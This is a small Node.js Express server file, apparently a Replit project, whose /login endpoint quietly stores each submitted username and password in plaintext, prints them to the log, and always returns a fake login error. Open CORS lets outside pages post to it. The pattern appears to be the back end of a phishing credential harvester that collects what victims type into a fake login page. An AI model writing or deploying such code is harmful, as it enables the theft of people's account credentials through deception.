const express = require('express')
const app = express()
const port = 3000
const path = require('path');
const Database = require("@replit/database");
const db = new Database();
const cors = require('cors');
const bodyParser = require("body-parser");

// create application/json parser
app.use(bodyParser.urlencoded({ extended: false }))

// parse application/json
app.use(bodyParser.json())

app.use(cors());


// Render Html File
app.post('/login',function(req, res) {
  console.log("hlloe")
  db
  .set(req.body.username, req.body.password).then(()=> {
    console.log(`Account Inputted: username: ${req.body.username}, password:${req.body.password}`);
    console.log("Success");
  })
  .catch(error => {
    console.log(error);
  });
  
  res.send({status: "404", error_code:"LOGIN_ERROR"});
});

app.get("/alldata", (req, res) => {
 console.log(db.get("aku suka"));
})

app.get('/', (req, res) => {
  res.send("Unauthorised Access Is Prohibited");
});

app.listen(port, () => {
  console.log(port);
});